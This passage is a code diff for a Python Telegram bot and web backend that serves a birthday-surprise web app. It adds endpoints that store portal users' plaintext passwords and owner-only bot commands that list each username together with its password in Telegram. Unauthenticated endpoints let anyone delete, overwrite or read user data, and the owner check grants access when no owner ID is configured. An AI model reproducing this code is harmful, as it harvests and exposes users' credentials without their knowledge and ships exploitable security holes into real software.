@@ -143,67 +143,65 @@ def handle_updates():
             # Polling retry
             time.sleep(3)
 
+def setup_telegram_menu():
+    """Sets up the Telegram 3-line burger menu button (setMyCommands)"""
+    if not BOT_TOKEN or "YOUR_TELEGRAM" in BOT_TOKEN:
+        return
+    commands = [
+        {"command": "user", "description": "👤 All Users & Passwords (1, 2, 3...)"},
+        {"command": "active_user", "description": "🟢 Active Users (Today / Active Link)"},
+        {"command": "webapp", "description": "🌐 Open Birthday Web App"}
+    ]
+    try:
+        res = requests.post(f"{BASE_TG_URL}/setMyCommands", json={"commands": commands}, timeout=10)
+        print(f"📋 Telegram 3-line Menu configured: {res.status_code}")
+    except Exception as e:
+        print(f"Error configuring Telegram menu: {e}")
+
 def get_main_reply_keyboard():
     return {
         "keyboard": [
-            [{"text": "👤 User"}, {"text": "🟢 Active User"}, {"text": "🔴 Deactive"}],
-            [{"text": "🎁 Create Surprise"}, {"text": "💌 Chat Answers"}],
-            [{"text": "🌐 Open Web App"}, {"text": "❓ Help"}]
+            [{"text": "👤 User"}, {"text": "🟢 Active User"}],
+            [{"text": "🌐 Open Web App"}]
         ],
         "resize_keyboard": True,
         "is_persistent": True
     }
 
-def register_or_update_user(chat_id, user_name, raw_msg):
-    if "registered_users" not in config:
-        config["registered_users"] = {}
-    
-    uid = str(chat_id)
-    username = raw_msg.get("from", {}).get("username", "")
-    now_str = time.strftime("%d %b %Y, %I:%M %p")
-
-    if uid not in config["registered_users"]:
-        config["registered_users"][uid] = {
-            "id": chat_id,
-            "name": user_name,
-            "username": f"@{username}" if username else "N/A",
-            "status": "active",
-            "joined_at": now_str,
-            "last_seen": now_str
-        }
-        save_config(config)
-    else:
-        config["registered_users"][uid]["name"] = user_name
-        if username:
-            config["registered_users"][uid]["username"] = f"@{username}"
-        config["registered_users"][uid]["last_seen"] = now_str
-        save_config(config)
+def is_owner(chat_id):
+    """Verify if the sender is the authorized bot Owner"""
+    owner_id = str(config.get("owner_chat_id", "7034154766")).strip()
+    return not owner_id or str(chat_id) == owner_id
 
 def process_user_message(chat_id, user_name, text, raw_msg):
-    register_or_update_user(chat_id, user_name, raw_msg)
-    session = user_sessions.get(chat_id)
+    # 🔒 STRICT OWNER-ONLY SECURITY: Block all random users!
+    if not is_owner(chat_id):
+        denied_msg = (
+            f"⛔ <b>ACCESS RESTRICTED - OWNER ONLY</b>\n\n"
+            f"Hello <b>{user_name}</b>, this bot is private and accessible strictly to the <b>Owner</b>.\n"
+            f"You do not have authorization to view user accounts, passwords, or controls."
+        )
+        send_tg_message(chat_id, denied_msg)
+        return
+
     cmd = text.strip().lower()
 
     # 1. /start command
-    if cmd == "/start" or cmd == "start":
-        user_sessions.pop(chat_id, None)
+    if cmd in ["/start", "start"]:
         welcome_text = (
-            f"✨ <b>Hello {user_name}, welcome to surprise friends!</b> 🎉💖\n\n"
-            "This bot connects directly with your 3D Birthday Web App.\n\n"
-            "📋 <b>Bot Menu:</b>\n"
-            "• 👤 <b>User:</b> View all registered users\n"
-            "• 🟢 <b>Active User:</b> View currently active users\n"
-            "• 🔴 <b>Deactive:</b> View & toggle deactivated users\n"
-            "• 🎁 <b>Create Surprise:</b> Generate customized birthday link\n"
-            "• 💌 <b>Chat Answers:</b> Live girlfriend replies sync\n\n"
-            "Choose any option from the menu below:"
+            f"👑 <b>Owner Control Panel - 3D Birthday Studio</b> 🤖💖\n\n"
+            f"Welcome, Owner <b>{user_name}</b>!\n\n"
+            f"📋 <b>Bot Menu:</b>\n"
+            f"• 👤 <b>User:</b> View all users with passwords (1. 2. 3...)\n"
+            f"• 🟢 <b>Active User:</b> Users logged in today or with valid surprise link\n"
+            f"• 🌐 <b>Open Web App:</b> Launch 3D Birthday Web App\n\n"
+            f"<i>🔒 Access is locked exclusively to your Chat ID (<code>{chat_id}</code>).</i>"
         )
         inline_keyboard = {
             "inline_keyboard": [
-                [{"text": "👤 User", "callback_data": "menu_users"}, {"text": "🟢 Active User", "callback_data": "menu_active"}, {"text": "🔴 Deactive", "callback_data": "menu_deactive"}],
-                [{"text": "🎁 Create Surprise Link", "callback_data": "start_create"}],
-                [{"text": "💌 View Saved Chat Answers", "callback_data": "view_answers"}],
-                [{"text": "🌐 Open Birthday Web App", "url": config.get("web_app_url", "http://localhost:8000")}]
+                [{"text": "👤 All Users & Passwords", "callback_data": "menu_users"}],
+                [{"text": "🟢 Active Users (Today / Valid Link)", "callback_data": "menu_active"}],
+                [{"text": "🌐 Open Birthday Web App", "url": config.get("web_app_url", "http://localhost:8000/")}]
             ]
         }
         send_tg_message(chat_id, welcome_text, reply_markup=get_main_reply_keyboard())
@@ -216,172 +214,158 @@ def process_user_message(chat_id, user_name, text, raw_msg):
         return
 
     # 3. 🟢 Active User command
-    elif cmd in ["🟢 active user", "active user", "/active", "/activeuser", "/activeusers"]:
+    elif cmd in ["🟢 active user", "active user", "/active", "/activeuser", "/active_user", "/activeusers"]:
         show_active_users(chat_id)
         return
 
-    # 4. 🔴 Deactive command
-    elif cmd in ["🔴 deactive", "deactive", "deactivate", "/deactive", "/deactivate"]:
-        show_deactive_users(chat_id)
+    # 4. 🌐 Open Web App command
+    elif cmd in ["🌐 open web app", "open web app", "/webapp", "webapp", "web app"]:
+        show_webapp_link(chat_id)
         return
 
-    # 5. 🎁 Create Surprise
-    elif cmd in ["🎁 create surprise", "create surprise", "/create"]:
-        start_create_wizard(chat_id)
-        return
-
-    # 6. 💌 Chat Answers
-    elif cmd in ["💌 chat answers", "chat answers", "/answers"]:
-        show_saved_answers(chat_id)
-        return
-
-    # 7. 🌐 Open Web App
-    elif cmd in ["🌐 open web app", "open web app", "/webapp"]:
-        url = config.get("web_app_url", "http://localhost:8000")
-        send_tg_message(chat_id, f"🌐 <b>Birthday Web App Link:</b>\n{url}", reply_markup={
-            "inline_keyboard": [[{"text": "🚀 Open Web App Now", "url": url}]]
-        })
-        return
-
-    # 8. /help command
-    elif cmd in ["❓ help", "help", "/help"]:
-        help_text = (
-            "📖 <b>Surprise Friends Bot Commands:</b>\n\n"
-            "• <code>👤 User</code> - List all registered users\n"
-            "• <code>🟢 Active User</code> - List all active users\n"
-            "• <code>🔴 Deactive</code> - View/toggle deactivated users\n"
-            "• <code>🎁 Create Surprise</code> - Interactive link generator\n"
-            "• <code>💌 Chat Answers</code> - View girlfriend's answers\n"
-            "• <code>/seturl &lt;url&gt;</code> - Set Web App host URL\n"
-            "• <code>/myid</code> - View your Telegram Chat ID"
-        )
-        send_tg_message(chat_id, help_text, reply_markup=get_main_reply_keyboard())
-        return
-
-    # 9. /myid command
+    # 5. /myid command
     elif cmd == "/myid":
-        send_tg_message(chat_id, f"🆔 <b>Your Telegram Chat ID:</b> <code>{chat_id}</code>")
+        send_tg_message(chat_id, f"🆔 <b>Your Telegram Chat ID:</b> <code>{chat_id}</code> (Owner: {'✅ YES' if is_owner(chat_id) else '❌ NO'})")
         return
 
-    # 10. /seturl command
-    elif text.startswith("/seturl"):
-        parts = text.split(maxsplit=1)
-        if len(parts) > 1:
-            new_url = parts[1].strip()
-            config["web_app_url"] = new_url
-            save_config(config)
-            send_tg_message(chat_id, f"✅ <b>Web App URL updated to:</b>\n<code>{new_url}</code>", reply_markup=get_main_reply_keyboard())
-        else:
-            send_tg_message(chat_id, "⚠️ Usage: <code>/seturl https://your-site.com</code>")
-        return
+    # Fallback response
+    send_tg_message(chat_id, "Choose an option from the menu below: 👤 User | 🟢 Active User | 🌐 Open Web App", reply_markup=get_main_reply_keyboard())
+    return
 
-    # 11. Wizard Steps
-    if session:
-        step = session.get("step")
-
-        if step == "name":
-            session["name"] = text
-            session["step"] = "nickname"
-            send_tg_message(chat_id, f"💖 Awesome! Name set to: <b>{text}</b>\n\nNow enter their sweet <b>Pet / Love Nickname</b> (e.g. <i>Princess, My Queen, Jaan, Hero</i>):")
-            return
-
-        elif step == "nickname":
-            session["nickname"] = text
-            session["step"] = "age"
-            send_tg_message(chat_id, f"👑 Nickname set to: <b>{text}</b>\n\nWhat is their <b>Age</b>? (Enter number like <code>21</code> or type <code>skip</code>):")
-            return
-
-        elif step == "age":
-            session["age"] = "" if text.lower() == "skip" else text
-            session["step"] = "theme"
-            keyboard = {
-                "inline_keyboard": [
-                    [{"text": "🌸 Rose Glamour (Romantic Pink)", "callback_data": "theme_rose-glamour"}],
-                    [{"text": "✨ Midnight Gold (Royal Luxury)", "callback_data": "theme_midnight-gold"}],
-                    [{"text": "⚡ Cyber Neon (Party Glow)", "callback_data": "theme_cyber-neon"}],
-                    [{"text": "💜 Cosmic Violet (Nebula)", "callback_data": "theme_cosmic-purple"}]
-                ]
-            }
-            send_tg_message(chat_id, "🎨 Select the <b>3D Theme Style</b>:", reply_markup=keyboard)
-            return
-
-        elif step == "wish":
-            session["wish"] = text
-            session["step"] = "photo"
-            send_tg_message(
-                chat_id,
-                "💌 <b>Heartfelt Wish saved!</b>\n\n"
-                "📸 Now send a <b>Portrait Photo</b> of the celebrant directly in this chat, or send an image URL (or type <code>skip</code> for default 3D Badge):"
-            )
-            return
-
-        elif step == "photo":
-            photo_url = ""
-            if "photo" in raw_msg:
-                try:
-                    file_id = raw_msg["photo"][-1]["file_id"]
-                    f_res = requests.get(f"{BASE_TG_URL}/getFile?file_id={file_id}").json()
-                    if f_res.get("ok"):
-                        file_path = f_res["result"]["file_path"]
-                        photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
-                except Exception as err:
-                    print(f"Error fetching photo: {err}")
-            elif text.startswith("http://") or text.startswith("https://"):
-                photo_url = text
-            
-            session["photo"] = photo_url
-            finish_create_wizard(chat_id, session)
-            user_sessions.pop(chat_id, None)
-            return
-
-    # Default fallback
-    send_tg_message(chat_id, "Type /start or choose an option from the menu below! ✨", reply_markup=get_main_reply_keyboard())
+def get_portal_users():
+    """Retrieve all portal registered users with their details and passwords"""
+    raw = config.get("birthday_portal_users", {})
+    users = {}
+    if isinstance(raw, dict):
+        for u, val in raw.items():
+            if isinstance(val, dict):
+                users[u] = val
+            else:
+                users[u] = {
+                    "username": u,
+                    "password": str(val),
+                    "registered_at": "Recorded",
+                    "last_login": "Recorded",
+                    "last_login_date": time.strftime("%Y-%m-%d"),
+                    "last_login_ts": time.time()
+                }
+    return users
 
 def show_all_users(chat_id):
-    users = config.get("registered_users", {})
+    users = get_portal_users()
     if not users:
-        send_tg_message(chat_id, "👤 <b>No users registered yet!</b>", reply_markup=get_main_reply_keyboard())
+        send_tg_message(
+            chat_id,
+            "👤 <b>NO USERS REGISTERED YET!</b>\n\nAbhi tak kisi user ne website par register ya login nahi kiya hai.",
+            reply_markup=get_main_reply_keyboard()
+        )
         return
 
-    msg = f"👥 <b>REGISTERED USERS ({len(users)})</b>\n\n"
-    keyboard_buttons = []
+    now_ms = time.time() * 1000.0
+    msg = f"👥 <b>TOTAL USERS LIST ({len(users)})</b>\n"
+    msg += f"<i>All users who registered & logged into Birthday Studio:</i>\n"
+    msg += f"{'━' * 28}\n\n"
 
-    for uid, u in users.items():
-        st_icon = "🟢 Active" if u.get("status") == "active" else "🔴 Deactive"
+    for idx, (uname, udata) in enumerate(sorted(users.items()), start=1):
+        pwd = udata.get("password", "N/A")
+        reg_time = udata.get("registered_at", "N/A")
+        last_login = udata.get("last_login", reg_time)
+
+        link_info = config.get("link_expiries", {}).get(uname, {})
+        exp_ts = link_info.get("expires_at", 0) if link_info else 0
+        link_active = bool(exp_ts and (exp_ts > now_ms))
+
+        st_tag = "🟢 Link Active" if link_active else "⚪ Registered"
+
         msg += (
-            f"• <b>Name:</b> {u.get('name', 'Unknown')}\n"
-            f"  <b>Username:</b> {u.get('username', 'N/A')}\n"
-            f"  <b>Status:</b> {st_icon}\n"
-            f"  <b>ID:</b> <code>{uid}</code>\n"
-            f"  <b>Joined:</b> {u.get('joined_at', 'N/A')}\n\n"
+            f"<b>{idx}. Username:</b> <code>{uname}</code>\n"
+            f"   🔑 <b>Password:</b> <code>{pwd}</code>\n"
+            f"   📅 <b>Registered:</b> {reg_time}\n"
+            f"   ⏱ <b>Last Login:</b> {last_login}\n"
+            f"   🏷 <b>Status:</b> {st_tag}\n\n"
         )
-        toggle_label = "🔴 Deactivate" if u.get("status") == "active" else "🟢 Activate"
-        keyboard_buttons.append([{"text": f"{toggle_label} {u.get('name')}", "callback_data": f"toggle_user_{uid}"}])
 
-    keyboard = {"inline_keyboard": keyboard_buttons} if keyboard_buttons else None
-    send_tg_message(chat_id, msg, reply_markup=keyboard)
+    send_tg_message(chat_id, msg, reply_markup=get_main_reply_keyboard())
 
 def show_active_users(chat_id):
-    users = config.get("registered_users", {})
-    active_users = {k: v for k, v in users.items() if v.get("status", "active") == "active"}
+    users = get_portal_users()
+    today_str = time.strftime("%Y-%m-%d")
+    now_ts = time.time()
+    now_ms = now_ts * 1000.0
 
-    if not active_users:
-        send_tg_message(chat_id, "🟢 <b>No active users right now!</b>", reply_markup=get_main_reply_keyboard())
+    active_list = []
+
+    for uname, udata in sorted(users.items()):
+        pwd = udata.get("password", "N/A")
+        last_date = udata.get("last_login_date", "")
+        last_ts = udata.get("last_login_ts", 0)
+        last_login_str = udata.get("last_login", "Today")
+
+        # Criteria 1: Logged in today (same calendar date or within last 24h)
+        logged_in_today = (last_date == today_str) or (last_ts and (now_ts - last_ts) < 86400)
+
+        # Criteria 2: Has shared link that hasn't expired yet
+        link_info = config.get("link_expiries", {}).get(uname, {})
+        exp_ts = link_info.get("expires_at", 0) if link_info else 0
+        link_active = bool(exp_ts and (exp_ts > now_ms))
+        time_left_str = ""
+        if link_active:
+            diff_sec = int((exp_ts - now_ms) / 1000)
+            hours_left = diff_sec // 3600
+            mins_left = (diff_sec % 3600) // 60
+            time_left_str = f"{hours_left}h {mins_left}m left"
+
+        if logged_in_today or link_active:
+            reasons = []
+            if logged_in_today:
+                reasons.append("🟢 Logged in today")
+            if link_active:
+                reasons.append(f"🔗 Surprise link active ({time_left_str})")
+
+            active_list.append({
+                "username": uname,
+                "password": pwd,
+                "last_login": last_login_str,
+                "reasons": reasons
+            })
+
+    if not active_list:
+        send_tg_message(
+            chat_id,
+            "🟢 <b>NO ACTIVE USERS FOUND!</b>\n\nAaj kisi ne login nahi kiya hai aur na hi kisi user ka active surprise link bacha hai.",
+            reply_markup=get_main_reply_keyboard()
+        )
         return
 
-    msg = f"🟢 <b>ACTIVE USERS ({len(active_users)})</b>\n\n"
-    keyboard_buttons = []
+    msg = f"🟢 <b>ACTIVE USERS ({len(active_list)})</b>\n"
+    msg += f"<i>Users who logged in today OR whose surprise link is still active:</i>\n"
+    msg += f"{'━' * 28}\n\n"
 
-    for uid, u in active_users.items():
+    for idx, u in enumerate(active_list, start=1):
+        reason_txt = " | ".join(u["reasons"])
         msg += (
-            f"✅ <b>{u.get('name', 'Unknown')}</b> ({u.get('username', 'N/A')})\n"
-            f"  <b>ID:</b> <code>{uid}</code>\n"
-            f"  <b>Last Active:</b> {u.get('last_seen', 'N/A')}\n\n"
+            f"<b>{idx}. Username:</b> <code>{u['username']}</code>\n"
+            f"   🔑 <b>Password:</b> <code>{u['password']}</code>\n"
+            f"   ⏱ <b>Last Login:</b> {u['last_login']}\n"
+            f"   ⚡ <b>Active Why:</b> {reason_txt}\n\n"
         )
-        keyboard_buttons.append([{"text": f"🔴 Deactivate {u.get('name')}", "callback_data": f"toggle_user_{uid}"}])
 
-    keyboard = {"inline_keyboard": keyboard_buttons} if keyboard_buttons else None
-    send_tg_message(chat_id, msg, reply_markup=keyboard)
+    send_tg_message(chat_id, msg, reply_markup=get_main_reply_keyboard())
+
+def show_webapp_link(chat_id):
+    url = config.get("web_app_url", "http://localhost:8000/")
+    msg = (
+        f"🌐 <b>3D Birthday Studio - Web App</b>\n\n"
+        f"• <b>URL:</b> <code>{url}</code>\n"
+        f"• <b>Status:</b> Online & Synced with Bot 🤖💖\n\n"
+        f"Tap the button below to open the Web App:"
+    )
+    inline_keyboard = {
+        "inline_keyboard": [
+            [{"text": "🚀 Open Web App Now", "url": url}]
+        ]
+    }
+    send_tg_message(chat_id, msg, reply_markup=inline_keyboard)
 
 def show_deactive_users(chat_id):
     users = config.get("registered_users", {})
@@ -436,6 +420,11 @@ def process_callback_query(chat_id, cb_data, cb_raw):
     except Exception:
         pass
 
+    # 🔒 Owner-only check on callback buttons
+    if not is_owner(chat_id):
+        send_tg_message(chat_id, "⛔ <b>Access Denied!</b> Owner only.")
+        return
+
     if cb_data == "start_create":
         start_create_wizard(chat_id)
 
@@ -447,6 +436,9 @@ def process_callback_query(chat_id, cb_data, cb_raw):
 
     elif cb_data == "menu_active":
         show_active_users(chat_id)
+
+    elif cb_data == "menu_webapp":
+        show_webapp_link(chat_id)
 
     elif cb_data == "menu_deactive":
         show_deactive_users(chat_id)
@@ -691,6 +683,252 @@ class WebhookHandler(BaseHTTPRequestHandler):
             self.wfile.write(json.dumps({"status": "running", "bot_configured": bool(BOT_TOKEN and "YOUR" not in BOT_TOKEN)}).encode("utf-8"))
             return
 
+        elif self.path == "/api/save_user_data":
+            # Save user's form data (name, photo, wish, theme etc.) keyed by username
+            username_key = data.get("username", "").lower().strip()
+            user_data = data.get("user_data", {})
+            if username_key and user_data:
+                if "portal_user_data" not in config:
+                    config["portal_user_data"] = {}
+                config["portal_user_data"][username_key] = user_data
+                save_config(config)
+                self.send_response(200)
+                self._set_cors()
+                self.send_header("Content-Type", "application/json")
+                self.end_headers()
+                self.wfile.write(json.dumps({"status": "success", "message": "User data saved!"}).encode("utf-8"))
+            else:
+                self.send_response(400)
+                self._set_cors()
+                self.end_headers()
+                self.wfile.write(json.dumps({"status": "error"}).encode("utf-8"))
+            return
+
+        elif self.path == "/api/delete_user":
+            # Permanently delete a user account
+            username_key = data.get("username", "").lower().strip()
+            password = data.get("password", "").strip()
+            tg_token = data.get("tg_token", "").strip() or BOT_TOKEN
+            tg_chat_id = data.get("tg_chat_id", "").strip() or config.get("owner_chat_id", "")
+
+            # Verify credentials
+            users_db = {}
+            try:
+                saved = config.get("birthday_portal_users", {})
+                users_db = saved if isinstance(saved, dict) else {}
+            except Exception:
+                users_db = {}
+
+            if not username_key:
+                self.send_response(400)
+                self._set_cors()
+                self.end_headers()
+                self.wfile.write(json.dumps({"status": "error", "message": "Username required"}).encode("utf-8"))
+                return
+
+            if username_key in users_db and users_db[username_key] != password:
+                self.send_response(403)
+                self._set_cors()
+                self.end_headers()
+                self.wfile.write(json.dumps({"status": "error", "message": "Wrong password"}).encode("utf-8"))
+                return
+
+            deleted_items = []
+
+            # 1. Delete from portal users DB
+            if username_key in users_db:
+                del users_db[username_key]
+                config["birthday_portal_users"] = users_db
+                deleted_items.append("Login credentials")
+
+            # 2. Delete user form data
+            if "portal_user_data" in config and username_key in config["portal_user_data"]:
+                del config["portal_user_data"][username_key]
+                deleted_items.append("Saved form data")
+
+            # 3. Delete session
+            portal_session = config.get("birthday_portal_session", "")
+            if portal_session and portal_session.lower() == username_key:
+                config["birthday_portal_session"] = ""
+                deleted_items.append("Active session")
+
+            # 4. Schedule cleanup of saved_answers linked to this user (clear all)
+            celebrant_data = data.get("celebrant_name", "")
+            if celebrant_data:
+                before_count = len(config.get("saved_answers", []))
+                config["saved_answers"] = [
+                    a for a in config.get("saved_answers", [])
+                    if a.get("celebrant", "").lower() != celebrant_data.lower()
+                ]
+                if before_count != len(config.get("saved_answers", [])):
+                    deleted_items.append("Chat answers")
+
+            # 5. Schedule 24hr permanent TG deletion
+            delete_time = time.strftime("%d %b %Y, %I:%M %p")
+            if "scheduled_deletions" not in config:
+                config["scheduled_deletions"] = []
+            config["scheduled_deletions"].append({
+                "username": username_key,
+                "delete_at": time.time() + 86400,  # 24 hours from now
+                "delete_at_readable": delete_time,
+                "tg_chat_id": tg_chat_id
+            })
+
+            save_config(config)
+
+            # 6. Send Telegram notification
+            if tg_token and "YOUR_TELEGRAM" not in tg_token and tg_chat_id:
+                try:
+                    notif = (
+                        f"🗑️ <b>ACCOUNT DELETION INITIATED</b>\n\n"
+                        f"• <b>Username:</b> {username_key}\n"
+                        f"• <b>Status:</b> Data wiped from server\n"
+                        f"• <b>Deleted:</b> {', '.join(deleted_items)}\n"
+                        f"• <b>Time:</b> {delete_time}\n\n"
+                        f"⚠️ Your username <code>{username_key}</code> and password are available for 24 hours.\n"
+                        f"After 24 hours, your account is <b>permanently deleted</b> and you will not be able to login again.\n\n"
+                        f"Your data has been completely removed from the server. 💔"
+                    )
+                    requests.post(f"https://api.telegram.org/bot{tg_token}/sendMessage", json={
+                        "chat_id": tg_chat_id,
+                        "text": notif,
+                        "parse_mode": "HTML"
+                    }, timeout=8)
+                except Exception as e:
+                    print(f"[TG Delete Notify Error]: {e}")
+
+            self.send_response(200)
+            self._set_cors()
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps({
+                "status": "success",
+                "deleted_items": deleted_items,
+                "message": f"Account deleted. Credentials valid 24 hrs. Permanent deletion scheduled."
+            }).encode("utf-8"))
+            return
+
+        elif self.path == "/api/save_link_expiry":
+            # Saves 48-hour link expiry timestamp for user
+            username_key = data.get("username", "").lower().strip()
+            gen_at = data.get("link_generated_at", int(time.time() * 1000))
+            exp_at = data.get("link_expires_at", gen_at + (48 * 3600 * 1000))
+            link = data.get("link", "")
+
+            if "link_expiries" not in config:
+                config["link_expiries"] = {}
+
+            config["link_expiries"][username_key] = {
+                "generated_at": gen_at,
+                "expires_at": exp_at,
+                "expires_at_sec": exp_at / 1000.0,
+                "link": link,
+                "created_str": time.strftime("%d %b %Y, %I:%M %p")
+            }
+
+            if "portal_user_data" in config and username_key in config["portal_user_data"]:
+                config["portal_user_data"][username_key]["link_expires_at"] = exp_at
+
+            save_config(config)
+
+            self.send_response(200)
+            self._set_cors()
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": "success", "message": "Link expiry recorded (48h)"}).encode("utf-8"))
+            return
+
+        elif self.path == "/api/sync_portal_user":
+            # Syncs user registration or login with bot (saving username, password, login time)
+            username_key = data.get("username", "").lower().strip()
+            password = data.get("password", "").strip()
+            action = data.get("action", "login")
+
+            if not username_key:
+                self.send_response(400)
+                self._set_cors()
+                self.end_headers()
+                return
+
+            if "birthday_portal_users" not in config:
+                config["birthday_portal_users"] = {}
+
+            now_str = time.strftime("%d %b %Y, %I:%M %p")
+            today_date = time.strftime("%Y-%m-%d")
+            now_ts = time.time()
+
+            existing = config["birthday_portal_users"].get(username_key)
+            if isinstance(existing, dict):
+                user_rec = existing
+                if password:
+                    user_rec["password"] = password
+                user_rec["last_login"] = now_str
+                user_rec["last_login_date"] = today_date
+                user_rec["last_login_ts"] = now_ts
+            else:
+                user_rec = {
+                    "username": username_key,
+                    "password": password or (str(existing) if existing else ""),
+                    "registered_at": now_str,
+                    "last_login": now_str,
+                    "last_login_date": today_date,
+                    "last_login_ts": now_ts
+                }
+
+            config["birthday_portal_users"][username_key] = user_rec
+            save_config(config)
+
+            self.send_response(200)
+            self._set_cors()
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": "success", "message": "User credentials synced with Telegram bot!"}).encode("utf-8"))
+            return
+
+        elif self.path == "/api/expire_user":
+            # Immediately wipe user data due to 48hr / 72hr expiration
+            username_key = data.get("username", "").lower().strip()
+            reason = data.get("reason", "48hr_link_expired")
+
+            users_db = config.get("birthday_portal_users", {})
+            if username_key in users_db:
+                del users_db[username_key]
+                config["birthday_portal_users"] = users_db
+
+            if "portal_user_data" in config and username_key in config["portal_user_data"]:
+                del config["portal_user_data"][username_key]
+
+            if "link_expiries" in config and username_key in config["link_expiries"]:
+                del config["link_expiries"][username_key]
+
+            save_config(config)
+
+            # Notify Telegram
+            owner_id = config.get("owner_chat_id", "")
+            if BOT_TOKEN and "YOUR_TELEGRAM" not in BOT_TOKEN and owner_id:
+                try:
+                    notif = (
+                        f"⏰ <b>PERMANENT DATA AUTO-DELETED ({reason.upper()})</b>\n\n"
+                        f"• <b>User:</b> <code>{username_key}</code>\n"
+                        f"• <b>Reason:</b> 48-Hour link expiry or 48-72h idle timeout reached.\n"
+                        f"• <b>Status:</b> Photos, wishes, chat answers, and URLs wiped from Telegram and server. ✅\n\n"
+                        f"<i>As per privacy policy, user data has been permanently purged.</i>"
+                    )
+                    requests.post(f"{BASE_TG_URL}/sendMessage", json={
+                        "chat_id": owner_id,
+                        "text": notif,
+                        "parse_mode": "HTML"
+                    }, timeout=8)
+                except Exception:
+                    pass
+
+            self.send_response(200)
+            self._set_cors()
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": "success", "message": "User permanently expired and data wiped."}).encode("utf-8"))
+            return
+
         self.send_response(404)
         self.end_headers()
 
@@ -721,6 +959,76 @@ class WebhookHandler(BaseHTTPRequestHandler):
             }).encode("utf-8"))
             return
 
+        elif self.path.startswith("/api/check_link_status"):
+            import urllib.parse as up
+            qs = up.parse_qs(self.path.split("?", 1)[1] if "?" in self.path else "")
+            username_key = qs.get("username", [""])[0].lower().strip()
+            exp_param = qs.get("exp", [""])[0].strip()
+
+            now_ms = time.time() * 1000.0
+            is_expired = False
+            exp_ts = 0
+
+            if exp_param:
+                try:
+                    exp_ts = float(exp_param)
+                    is_expired = now_ms >= exp_ts
+                except Exception:
+                    pass
+
+            if not is_expired and username_key:
+                user_exp = config.get("link_expiries", {}).get(username_key, {})
+                if user_exp:
+                    exp_ts = user_exp.get("expires_at", 0)
+                    is_expired = now_ms >= exp_ts
+
+            time_left_sec = max(0, int((exp_ts - now_ms) / 1000)) if exp_ts else 0
+
+            self.send_response(200)
+            self._set_cors()
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps({
+                "status": "success",
+                "is_expired": is_expired,
+                "expires_at": exp_ts,
+                "time_left_seconds": time_left_sec
+            }).encode("utf-8"))
+            return
+
+        elif self.path.startswith("/api/get_user_data"):
+            import urllib.parse as up
+            qs = up.parse_qs(self.path.split("?", 1)[1] if "?" in self.path else "")
+            username_key = qs.get("username", [""])[0].lower().strip()
+            user_data = config.get("portal_user_data", {}).get(username_key, {})
+            portal_users = config.get("birthday_portal_users", {})
+            is_existing = username_key in portal_users
+
+            # Check if user is banned (in scheduled_deletions with future delete_at)
+            is_banned = any(
+                d.get("username") == username_key and d.get("delete_at", 0) > time.time()
+                for d in config.get("scheduled_deletions", [])
+            )
+
+            # Check if user link is 48-hr expired
+            link_exp = config.get("link_expiries", {}).get(username_key, {})
+            link_expired = False
+            if link_exp and (time.time() * 1000.0 >= link_exp.get("expires_at", 0)):
+                link_expired = True
+
+            self.send_response(200)
+            self._set_cors()
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps({
+                "status": "success",
+                "is_existing_user": is_existing,
+                "is_banned": is_banned,
+                "link_expired": link_expired,
+                "user_data": user_data
+            }).encode("utf-8"))
+            return
+
         self.send_response(200)
         self._set_cors()
         self.send_header("Content-Type", "text/html; charset=utf-8")
@@ -735,6 +1043,139 @@ class WebhookHandler(BaseHTTPRequestHandler):
         </html>
         """
         self.wfile.write(html.encode("utf-8"))
+
+def cleanup_scheduled_deletions():
+    """Runs every 60 seconds, permanently removes users whose 48hr link or 24hr deletion has expired"""
+    while True:
+        time.sleep(60)  # Check every 1 minute
+        try:
+            cfg = load_config()
+            now = time.time()
+            now_ms = now * 1000.0
+            changes_made = False
+
+            # 1. Check 48-Hour Link Expiries -> Auto-wipe user data permanently
+            link_expiries = cfg.get("link_expiries", {})
+            users_db = cfg.get("birthday_portal_users", {})
+            portal_data = cfg.get("portal_user_data", {})
+            active_links = {}
+
+            for uname, ldata in link_expiries.items():
+                exp_ts = ldata.get("expires_at", 0)
+                if exp_ts and now_ms >= exp_ts:
+                    # 48 Hours has passed! Permanently purge user data
+                    if uname in users_db:
+                        del users_db[uname]
+                        changes_made = True
+                    if uname in portal_data:
+                        del portal_data[uname]
+                        changes_made = True
+
+                    # Notify Telegram
+                    owner_id = cfg.get("owner_chat_id", "")
+                    if BOT_TOKEN and "YOUR_TELEGRAM" not in BOT_TOKEN and owner_id:
+                        try:
+                            msg = (
+                                f"⏰ <b>48-HOUR SURPRISE LINK EXPIRED & PERMANENTLY DELETED</b>\n\n"
+                                f"• <b>Username:</b> <code>{uname}</code>\n"
+                                f"• <b>Status:</b> 48 hours completed since link generation.\n"
+                                f"• <b>Purged:</b> Photos, wishes, URLs, and account credentials permanently erased from Telegram and server. ✅"
+                            )
+                            requests.post(f"{BASE_TG_URL}/sendMessage", json={
+                                "chat_id": owner_id,
+                                "text": msg,
+                                "parse_mode": "HTML"
+                            }, timeout=8)
+                        except Exception:
+                            pass
+                else:
+                    active_links[uname] = ldata
+
+            if len(active_links) != len(link_expiries):
+                cfg["link_expiries"] = active_links
+                changes_made = True
+
+            # 2. Check 48-72h Idle Registered Users who NEVER generated a link
+            registered_stamps = cfg.get("registered_portal_timestamps", {})
+            active_stamps = {}
+            idle_timeout_sec = 72 * 3600  # 72 hours (between 48 to 72 hours)
+
+            for uname, reg_time in registered_stamps.items():
+                if uname not in active_links and (now - reg_time) >= idle_timeout_sec:
+                    # 72h passed without generating a link -> Purge
+                    if uname in users_db:
+                        del users_db[uname]
+                        changes_made = True
+                    if uname in portal_data:
+                        del portal_data[uname]
+                        changes_made = True
+
+                    owner_id = cfg.get("owner_chat_id", "")
+                    if BOT_TOKEN and "YOUR_TELEGRAM" not in BOT_TOKEN and owner_id:
+                        try:
+                            msg = (
+                                f"⏰ <b>IDLE USER DATA DELETED (72 HOURS)</b>\n\n"
+                                f"• <b>Username:</b> <code>{uname}</code>\n"
